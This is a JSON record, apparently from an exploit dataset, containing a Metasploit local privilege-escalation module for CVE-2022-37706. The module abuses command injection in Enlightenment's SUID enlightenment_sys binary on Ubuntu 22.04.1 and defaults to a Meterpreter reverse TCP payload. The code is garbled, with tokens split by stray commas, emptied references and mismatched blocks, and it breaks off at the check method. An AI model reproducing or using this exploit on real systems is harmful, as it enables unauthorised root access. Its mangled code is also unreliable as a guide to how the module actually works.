{
    "text": "vul_name : Ubuntu 22.04.1 X64 Desktop Enlightenment 0.25.3-1 Privilege Escalation ， vul_cve : CVE-2022-37706 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GreatRanking ， include Msf : Post : Linux : Priv ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Ubuntu Enlightenment Mount Priv Esc' ,  ， 'Description' => %q{ ， This module exploits a command injection within Enlightenment's ， enlightenment_sys binary. This is done by calling the mount ， command and feeding it paths which meet all of the system ， requirements , but execute a specific path as well due to a ， semi-colon being used. ， This module was tested on Ubuntu 22.04.1 X64 Desktop with ， enlightenment 0.25.3-1 ( current at module write time )  ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'h00die' ,  # msf module ， 'Maher Azzouzi' # discovery , poc ，  ]  ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'Privileged' => true ,  ， ' ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'CVE' , '2022-37706' ]  ，  ]  ,  ， 'DisclosureDate' => '2022-09-13' ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' ,  ， 'PrependFork' => true ,  # so we can exploit multiple times ， 'WfsDelay' => 10 ， } ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK ]  ， } ， register_advanced_options [  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， def find_enlightenment_sys ， enlightenment_sys = '/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys' ， vprint_good ( \"Found binary :  # {enlightenment_sys}\" )  ， vprint_good ( \"It's set for SUID\" )  ，  # at this time there doesn't seem to be any other way to check if it'll be exploitable ，  # like a version number as a patch hasn't been released yet ， end ， vprint_status ( 'Manually searching for exploitable binary' )  ， binary = cmd_exec ( 'find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1' )  ， vprint_good ( \"Found SUID binary :  # {enlightenment_sys}\" ) unless binary.nil? ， end ， end ， def check ， enlightenment_sys = find_enlightenment_sys",
    "time": "2022.10.05"
}